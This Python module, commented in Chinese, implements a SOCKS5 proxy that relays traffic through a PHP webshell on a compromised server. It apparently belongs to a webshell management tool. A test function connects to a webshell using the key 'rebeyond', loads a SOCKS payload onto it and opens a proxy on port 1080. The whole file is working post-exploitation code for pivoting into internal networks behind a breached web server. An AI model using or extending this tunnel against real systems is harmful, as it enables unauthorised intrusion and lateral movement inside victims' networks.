import socket
import threading
import struct
import hashlib
import time
import uuid
import ipaddress


from .phpPayload import phpPayload
from .phpShell import PhpShell



class SOCKS5Handler:
    """SOCKS5协议处理器"""
    
    def __init__(self, client_socket, tunnel_service):
        self.client_socket = client_socket
        self.tunnel_service = tunnel_service
        self.socket_hash = None
        self.target_ip = None
        self.target_port = None
        
    def handle_connection(self):
        """处理SOCKS5连接的完整流程"""
        try:
            # 1. SOCKS5认证阶段
            if not self.handle_auth():
                print("[DEBUG] SOCKS5认证失败")
                return
                
            # 2. SOCKS5连接请求阶段
            if not self.handle_connect_request():
                print("[DEBUG] SOCKS5连接请求处理失败")
                return
                
            # 3. 创建远程隧道
            if not self.create_remote_tunnel():
                print("[DEBUG] 创建远程隧道失败")
                return
                
            # 4. 开始数据转发
            self.start_data_forwarding()
            
        except Exception as e:
            print(f"[ERROR] SOCKS5处理异常: {e}")
            import traceback
            traceback.print_exc()
        finally:
            self.cleanup()
    
    def handle_auth(self):
        """处理SOCKS5认证阶段"""
        try:
            # 接收客户端认证请求
            data = self.client_socket.recv(256)
            if len(data) < 2:
                return False
                
            version = data[0]
            if version != 5:  # 只支持SOCKS5
                return False
                
            n_methods = data[1]
            methods = data[2:2+n_methods]
            
            print(f"[DEBUG] SOCKS5认证: 版本={version}, 方法数={n_methods}, 方法={list(methods)}")
            
            # 发送认证响应 (选择无认证方法 0x00)
            if 0 in methods:  # 支持无认证
                response = struct.pack('!BB', 5, 0)  # 版本5, 选择方法0 (无认证)
                self.client_socket.send(response)
                print("[DEBUG] SOCKS5认证成功: 选择无认证方法")
                return True
            else:
                # 不支持的认证方法
                response = struct.pack('!BB', 5, 0xFF)
                self.client_socket.send(response)
                return False
                
        except Exception as e:
            print(f"[ERROR] SOCKS5认证异常: {e}")
            return False
    
    def handle_connect_request(self):
        """处理SOCKS5连接请求"""
        try:
            # 接收连接请求
            data = self.client_socket.recv(256)
            if len(data) < 4:
                return False
                
            version = data[0]
            cmd = data[1]
            rsv = data[2]
            atyp = data[3]
            
            print(f"[DEBUG] SOCKS5连接请求: 版本={version}, 命令={cmd}, 地址类型={atyp}")
            
            if version != 5:
                return False
                
            if cmd != 1:  # 只支持CONNECT命令
                self.send_connect_response(5)  # 不支持的命令
                return False
            
            # 解析目标地址
            if atyp == 1:  # IPv4
                if len(data) < 10:
                    return False
                target_ip = socket.inet_ntoa(data[4:8])
                target_port = struct.unpack('!H', data[8:10])[0]
            elif atyp == 3:  # 域名
                domain_len = data[4]
                if len(data) < 5 + domain_len + 2:
                    return False
                domain = data[5:5+domain_len].decode('utf-8')
                target_port = struct.unpack('!H', data[5+domain_len:7+domain_len])[0]
                # 简单的域名解析
                try:
                    target_ip = socket.gethostbyname(domain)
                    print(f"[DEBUG] 域名解析: {domain} -> {target_ip}")
                except:
                    self.send_connect_response(4)  # 主机不可达
                    return False
            elif atyp == 4:  # IPv6
                # 暂不支持IPv6
                self.send_connect_response(8)  # 不支持的地址类型
                return False
            else:
                self.send_connect_response(8)  # 不支持的地址类型
                return False
            
            self.target_ip = target_ip
            self.target_port = target_port
            print(f"[DEBUG] 目标地址: {target_ip}:{target_port}")
            
            # 白名单验证
            if not self.is_ip_allowed(target_ip):
                print(f"[WARNING] 目标IP {target_ip} 不在白名单中，拒绝连接")
                self.send_connect_response(2)  # 不允许的连接
                return False
            
            print(f"[DEBUG] 目标地址通过白名单验证: {target_ip}:{target_port}")
            return True
            
        except Exception as e:
            print(f"[ERROR] SOCKS5连接请求异常: {e}")
            return False
    
    def send_connect_response(self, reply_code):
        """发送SOCKS5连接响应"""
        try:
            # 构造响应: VER=5, REP, RSV=0, ATYP=1, BND.ADDR=0.0.0.0, BND.PORT=0
            response = struct.pack('!BBBB4sH', 5, reply_code, 0, 1, 
                                 socket.inet_aton('0.0.0.0'), 0)
            self.client_socket.send(response)
            
            if reply_code == 0:
                print("[DEBUG] SOCKS5连接响应: 成功")
            else:
                print(f"[DEBUG] SOCKS5连接响应: 失败，错误码={reply_code}")
                
        except Exception as e:
            print(f"[ERROR] 发送SOCKS5响应异常: {e}")
    
    def create_remote_tunnel(self):
        """创建远程隧道连接"""
        try:
            # 生成唯一的socket hash
            self.socket_hash = self.generate_socket_hash()
            
            # 通过webshell创建到目标的隧道
            success = self.tunnel_service.shell.create_tunnel(
                self.target_ip, 
                str(self.target_port), 
                self.socket_hash,
                self.tunnel_service.socks_class_name
            )
            
            if success:
                # 发送成功响应给客户端
                self.send_connect_response(0)
                print(f"[DEBUG] 远程隧道创建成功: {self.target_ip}:{self.target_port}, hash={self.socket_hash}")
                return True
            else:
                # 发送失败响应给客户端
                self.send_connect_response(1)  # 一般性SOCKS服务器失败
                return False
                
        except Exception as e:
            print(f"[ERROR] 创建远程隧道异常: {e}")
            self.send_connect_response(1)
            return False
    
    def generate_socket_hash(self):
        """生成唯一的socket hash"""
        # 使用时间戳 + UUID + 目标地址生成唯一hash
        unique_str = f"{time.time()}{uuid.uuid4()}{self.target_ip}:{self.target_port}"
        return hashlib.md5(unique_str.encode()).hexdigest()[:16]
    
    def is_ip_allowed(self, target_ip):
        """检查目标IP是否在白名单中"""
        try:
            # 获取白名单配置
            ip_whitelist = self.tunnel_service.get_ip_whitelist()
            
            if not ip_whitelist:
                # 如果没有配置白名单，默认允许所有IP
                print(f"[DEBUG] 白名单未配置，允许访问: {target_ip}")
                return True
            
            target_addr = ipaddress.ip_address(target_ip)
            
            for allowed in ip_whitelist:
                try:
                    # 支持单个IP地址
                    if '/' not in allowed:
                        if target_addr == ipaddress.ip_address(allowed):
                            print(f"[DEBUG] IP白名单验证通过: {target_ip} 匹配 {allowed}")
                            return True
                    else:
                        # 支持CIDR网段
                        if target_addr in ipaddress.ip_network(allowed, strict=False):
                            print(f"[DEBUG] IP白名单验证通过: {target_ip} 在网段 {allowed} 中")
                            return True
                except ValueError as e:
                    print(f"[WARNING] 白名单条目格式错误: {allowed}, 错误: {e}")
                    continue
            
            print(f"[DEBUG] IP白名单验证失败: {target_ip} 不在白名单中")
            return False
            
        except Exception as e:
            print(f"[ERROR] IP白名单验证异常: {e}")
            # 异常情况下，为了安全，默认拒绝
            return False
    
    def start_data_forwarding(self):
        """开始双向数据转发 - 使用顺序处理避免竞态条件"""
        try:
            print(f"[DEBUG] 开始数据转发: {self.target_ip}:{self.target_port}")
            
            # 使用单线程顺序处理，避免并发问题
            self.sequential_data_forwarding()
            
        except Exception as e:
            print(f"[ERROR] 数据转发异常: {e}")
    
    def sequential_data_forwarding(self):
        """顺序数据转发：使用 doReadWrite 在一个请求中完成读写"""
        try:
            # 设置socket为非阻塞模式，避免阻塞
            self.client_socket.settimeout(0.1)
            
            while True:
                has_data_activity = False
                client_data = None
                
                # 步骤1：尝试从客户端读取数据
                try:
                    client_data = self.client_socket.recv(4096)
                    if client_data and len(client_data) > 0:
                        print(f"[DEBUG] 客户端->远程: 接收 {len(client_data)} 字节")
                        has_data_activity = True
                    elif len(client_data) == 0:
                        print("[DEBUG] 客户端连接关闭")
                        break
                        
                except socket.timeout:
                    # 客户端暂时没有数据，继续
                    pass
                except Exception as e:
                    if "timed out" not in str(e).lower():
                        print(f"[DEBUG] 客户端读取异常: {e}")
                        break
                
                # 步骤2：使用 doReadWrite 一次性完成写入和读取
                try:
                    # 调用 doReadWrite，无论是否有数据都要调用（可能只读取）
                    remote_data = self.tunnel_service.shell.doReadWrite(
                        self.socket_hash,
                        client_data if client_data else b"",  # 没有数据时传空字节
                        self.tunnel_service.socks_class_name
                    )
                    
                    if remote_data is None:
                        print("[DEBUG] doReadWrite 返回 None")
                        # 如果有写入但读取失败，可能是暂时性问题
                        if has_data_activity:
                            time.sleep(0.05)
                            continue
                        else:
                            break
                    elif isinstance(remote_data, bytes) and len(remote_data) > 0:
                        print(f"[DEBUG] 远程->客户端: 接收 {len(remote_data)} 字节")
                        
                        try:
                            self.client_socket.send(remote_data)
                            has_data_activity = True
                        except:
                            print("[DEBUG] 客户端连接已断开")
                            break
                    
                except Exception as e:
                    print(f"[DEBUG] doReadWrite异常: {e}")
                    if has_data_activity:
                        # 有数据活动但出错，短暂等待后继续
                        time.sleep(0.05)
                        continue
                    else:
                        break
                
                # 如果没有任何数据活动，短暂休息
                if not has_data_activity:
                    time.sleep(0.05)
                    
        except Exception as e:
            print(f"[ERROR] 顺序数据转发异常: {e}")
        finally:
            print("[DEBUG] 数据转发线程结束")
    
    
    def cleanup(self):
        """清理资源"""
        try:
            if self.client_socket:
                self.client_socket.close()
            print(f"[DEBUG] SOCKS5连接清理完成: {self.socket_hash}")
        except:
            pass


class SocksService:
    """SOCKS隧道服务主类"""
    
    def __init__(self, shell: PhpShell, listen_ip: str, listen_port: int, ip_whitelist=None, socks_class_name: str = "SocksProxy"):
        self.shell = shell
        self.listen_ip = listen_ip
        self.listen_port = listen_port
        self.socks_class_name = socks_class_name
        self.server_socket = None
        self.is_running = False
        self.active_connections = {}
        
        # 统计信息
        self.connection_count = 0
        self.total_bytes_sent = 0
        self.total_bytes_received = 0
        
        # IP白名单配置
        # 支持格式：["192.168.1.0/24", "10.0.0.100", "172.16.0.0/16"]
        self.ip_whitelist = ip_whitelist or []
        
        # 打印初始白名单配置
        if self.ip_whitelist:
            print(f"[INFO] IP白名单已配置: {self.ip_whitelist}")
        else:
            print("[INFO] 未配置IP白名单，将允许访问所有地址")
    
    def get_ip_whitelist(self):
        """获取IP白名单"""
        return self.ip_whitelist
    
    def set_ip_whitelist(self, whitelist):
        """设置IP白名单"""
        self.ip_whitelist = whitelist or []
        if self.ip_whitelist:
            print(f"[INFO] 更新IP白名单: {self.ip_whitelist}")
        else:
            print("[INFO] 清空IP白名单，将允许访问所有地址")
    
    def add_to_whitelist(self, ip_or_network):
        """添加IP或网段到白名单"""
        if ip_or_network not in self.ip_whitelist:
            self.ip_whitelist.append(ip_or_network)
            print(f"[INFO] 添加到白名单: {ip_or_network}")
        else:
            print(f"[INFO] {ip_or_network} 已在白名单中")
    
    def remove_from_whitelist(self, ip_or_network):
        """从白名单中移除IP或网段"""
        if ip_or_network in self.ip_whitelist:
            self.ip_whitelist.remove(ip_or_network)
            print(f"[INFO] 从白名单移除: {ip_or_network}")
        else:
            print(f"[INFO] {ip_or_network} 不在白名单中")
    
    def start(self) -> bool:
        """启动 SOCKS 服务（在后台线程中运行）"""
        try:
            # 在单独的线程中启动服务器
            server_thread = threading.Thread(target=self._run_server, daemon=True)
            server_thread.start()
            
            # 等待一小段时间确保服务器启动
            time.sleep(0.5)
            
            if self.is_running:
                print(f"✅ SOCKS隧道已在后台启动")
                return True
            else:
                print(f"❌ SOCKS隧道启动失败")
                return False
                
        except Exception as e:
            print(f"[ERROR] 启动SOCKS隧道失败: {e}")
            return False
    
    def stop(self):
        """停止 SOCKS 服务"""
        self.stop_socks_server()
    
    def _run_server(self):
        """在后台线程中运行服务器"""
        self.start_socks_server(self.listen_ip, self.listen_port)
    
    def start_socks_server(self, listen_ip="0.0.0.0", listen_port=1080):
        """启动SOCKS5代理服务器"""
        try:
            
            # 创建服务器socket
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # 设置 socket 选项以支持端口重用
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # 设置 SO_LINGER 选项，立即关闭连接
            linger = struct.pack('ii', 1, 0)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, linger)
            
            # 设置超时，使 accept() 可以被中断
            self.server_socket.settimeout(1.0)
            
            self.server_socket.bind((listen_ip, listen_port))
            self.server_socket.listen(10)
            
            self.is_running = True
            print(f"✓ SOCKS5代理服务器启动成功: {listen_ip}:{listen_port}")
            
            # 主循环：接受客户端连接
            while self.is_running:
                try:
                    client_socket, client_address = self.server_socket.accept()
                    print(f"[DEBUG] 新的SOCKS5客户端连接: {client_address}")
                    
                    # 为每个客户端创建处理线程
                    handler = SOCKS5Handler(client_socket, self)
                    client_thread = threading.Thread(
                        target=handler.handle_connection,
                        daemon=True
                    )
                    client_thread.start()
                    
                except socket.timeout:
                    # 超时是正常的，继续循环检查 is_running
                    continue
                except socket.error as e:
                    if self.is_running:
                        print(f"[ERROR] 接受客户端连接失败: {e}")
                    break
                    
        except Exception as e:
            print(f"[ERROR] 启动SOCKS5服务器失败: {e}")
            return False
        finally:
            self.cleanup()
    
    def stop_socks_server(self):
        """停止SOCKS5代理服务器"""
        print("[DEBUG] 正在停止SOCKS5代理服务器...")
        self.is_running = False
        
        # 强制关闭服务器socket
        if self.server_socket:
            try:
                # 先shutdown再close，确保立即停止接收连接
                self.server_socket.shutdown(socket.SHUT_RDWR)
            except:
                pass
            try:
                self.server_socket.close()
            except:
                pass
            finally:
                self.server_socket = None
        
        # 等待线程终止
        import time
        time.sleep(0.1)  # 给线程一点时间来终止
        
        # 清理所有远程隧道
        if self.shell and self.socks_class_name:
            try:
                self.shell.doClear(self.socks_class_name)
                print("[DEBUG] 已清理所有远程隧道")
            except:
                pass
        
        print("✓ SOCKS5代理服务器已停止")
    
    def cleanup(self):
        """清理资源"""
        self.stop_socks_server()



# 针对php的测试代码
def test_tunnel_service_php():
    """测试隧道服务"""
    try:
        # 初始化webshell连接
        shell = PhpShell(
            url="http://localhost:8000/xor_base64.php",
            param_name="pass", 
            secret_key="rebeyond"
        )
        shell.response_encrypt_type = 'xor_base64'
        
        IP_WHITELIST = [
            "172.26.32.1",       # 允许目标服务器IP
        ]
        
        # 初始化 payload
        if not shell.init_payload(payload_name="mainPayload_xor_base64"):
            print("❌ Payload初始化失败")
            return
        
        # 测试webshell连接
        if not shell.test():
            print("✗ Webshell连接测试失败")
            return False
        
        print("✓ Webshell连接测试成功")
        
        payload = phpPayload()
        SocksPayload = payload.getPayload(
            payload_name="SocksProxy",
            webshell_id=None
        )
        
        if not shell.include(code_name="SocksProxy", bin_code=SocksPayload):
            print("❌ 加载SocksService类失败")
            return False

        # 创建隧道服务
        tunnel_service = SocksService(
            shell=shell,
            listen_ip="0.0.0.0",
            listen_port=1080,
            ip_whitelist=IP_WHITELIST,
            socks_class_name="SocksProxy"
        )
        
        # 启动SOCKS5代理服务器
        print("[INFO] 启动SOCKS5代理服务器...")
        print("[INFO] 可以配置浏览器代理为: 127.0.0.1:1080")
        print("[INFO] 按Ctrl+C停止服务")
        
        tunnel_service.start_socks_server("0.0.0.0", 1080)
        
    except KeyboardInterrupt:
        print("\n[INFO] 收到停止信号")
    except Exception as e:
        print(f"[ERROR] 测试异常: {e}")
        import traceback
        traceback.print_exc()
    finally:
        print("[INFO] 测试结束")
    

if __name__ == "__main__":
    test_tunnel_service_php()